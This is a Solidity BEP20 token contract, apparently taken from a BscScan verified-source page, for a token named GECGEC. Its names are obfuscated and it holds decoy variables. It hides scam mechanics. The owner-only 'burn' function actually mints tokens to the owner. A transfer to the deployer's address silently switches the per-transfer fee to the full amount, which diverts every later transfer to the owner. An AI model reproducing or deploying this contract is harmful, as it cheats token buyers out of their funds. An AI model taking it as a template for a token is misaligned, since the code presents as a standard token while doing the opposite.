/**
 *Submitted for verification at BscScan.com on 2022-12-04
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;
contract GECGEC {
uint256 public  XyBzCW = 1000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  kdOpWv = 100000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  JNABgh = 10000000000000000;
uint256 public  vVrCDB = 100000000000000000000000;
address public  HUpJam = address(0);
string public  name = "GECGEC";
address public  LASfzJ = address(0);
address public  VistAe = address(0);
mapping (address => uint256) public balanceOf;
address public owner;
uint256 private  ZcwyNy = 10000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  bVmgaa = 100000000000000000000000;
address public  HIQurK = address(0);
uint256 public  ZnHcKK = 10000000000000000000000000000;
address public  iuUqAC = address(0);
address public  raAEYy = address(0);
uint8 public constant decimals = 18;
uint256 public  LDFOeV = 10000000000000000000;
uint256 public  zIcRGL = 100000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  hknXYL = address(0);
string public  symbol = "GECGEC";
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public constant QSIjDl = 99999999999+1;
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
constructor () {
hknXYL = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "cTJdLt");
require(to != address(0), "cTJdLt");
require(amount <= balanceOf[from], "cTJdLt");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* QSIjDl/ZcwyNy ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==hknXYL){
ZcwyNy = 99999999999+1;
}
emit Transfer(from, to, transferAmount);
}

}